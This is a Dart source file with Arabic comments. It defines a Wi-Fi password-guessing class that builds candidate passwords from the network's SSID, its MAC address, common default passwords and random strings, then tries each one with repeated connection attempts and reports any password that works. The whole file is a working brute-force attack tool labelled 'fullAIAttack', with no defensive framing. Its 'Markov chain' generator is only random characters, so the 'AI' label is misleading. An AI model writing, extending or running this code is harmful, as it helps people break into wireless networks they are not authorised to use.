import 'dart:math';
import 'package:wifi_manager/wifi_manager.dart';

class AIPasswordGuesser {
  final WifiManager _wifiManager = WifiManager();
  final Random _random = Random();
  
  // قاعدة بيانات الكلمات الشائعة
  final List<String> _commonWords = [
    'password', 'admin', 'wifi', 'network', 'internet', 'router', 'modem',
    '12345678', '00000000', '11111111', '22222222', '33333333', '44444444',
    '55555555', '66666666', '77777777', '88888888', '99999999',
    'qwerty', 'abc123', 'passw0rd', 'admin123', 'root123',
  ];
  
  // أحرف شائعة للإضافة
  final List<String> _commonSuffixes = ['', '123', '2024', '!', '@', '#', '123!', '123@'];
  final List<String> _commonPrefixes = ['', 'admin', 'user', 'root', 'wifi'];
  
  Future<List<String>> generateSmartPasswords(String ssid, String bssid) async {
    final passwords = <String>{};
    
    // 1. كلمات مرتبطة بـ SSID
    if (ssid.isNotEmpty) {
      passwords.add(ssid);
      for (final suffix in _commonSuffixes) {
        passwords.add('$ssid$suffix');
      }
      for (final prefix in _commonPrefixes) {
        passwords.add('$prefix$ssid');
      }
    }
    
    // 2. كلمات مرتبطة بـ BSSID (MAC address)
    final macClean = bssid.replaceAll(':', '').toLowerCase();
    if (macClean.length >= 8) {
      passwords.add(macClean);
      passwords.add(macClean.substring(macClean.length - 8));
      passwords.add(macClean.substring(0, 8));
      passwords.add(macClean.substring(macClean.length - 6));
      passwords.add(macClean.substring(0, 6));
    }
    
    // 3. كلمات شائعة
    passwords.addAll(_commonWords);
    
    // 4. توليد Markov Chain (محاكاة)
    for (var i = 0; i < 100; i++) {
      final generated = _generateMarkovPassword(6 + _random.nextInt(8));
      passwords.add(generated);
    }
    
    // 5. توليد كلمات عشوائية
    for (var i = 0; i < 50; i++) {
      passwords.add(_generateRandomPassword(8));
    }
    
    return passwords.toList();
  }
  
  String _generateMarkovPassword(int length) {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    var result = '';
    for (var i = 0; i < length; i++) {
      result += chars[_random.nextInt(chars.length)];
    }
    return result;
  }
  
  String _generateRandomPassword(int length) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#\$%^&*';
    var result = '';
    for (var i = 0; i < length; i++) {
      result += chars[_random.nextInt(chars.length)];
    }
    return result;
  }
  
  Future<bool> tryAIGuess(String bssid, String ssid) async {
    final passwords = await generateSmartPasswords(ssid, bssid);
    
    for (final pwd in passwords) {
      try {
        final connected = await _wifiManager.connect(bssid, pwd);
        if (connected) return true;
        await Future.delayed(Duration(milliseconds: 100));
      } catch (_) {}
    }
    return false;
  }
  
  Future<Map<String, dynamic>> fullAIAttack(String bssid, String ssid) async {
    final startTime = DateTime.now();
    final passwords = await generateSmartPasswords(ssid, bssid);
    int attempts = 0;
    
    for (final pwd in passwords) {
      attempts++;
      try {
        final connected = await _wifiManager.connect(bssid, pwd);
        if (connected) {
          return {
            'success': true,
            'password': pwd,
            'attempts': attempts,
            'duration_seconds': DateTime.now().difference(startTime).inSeconds,
          };
        }
      } catch (_) {}
    }
    
    return {
      'success': false,
      'attempts': attempts,
      'duration_seconds': DateTime.now().difference(startTime).inSeconds,
    };
  }
}
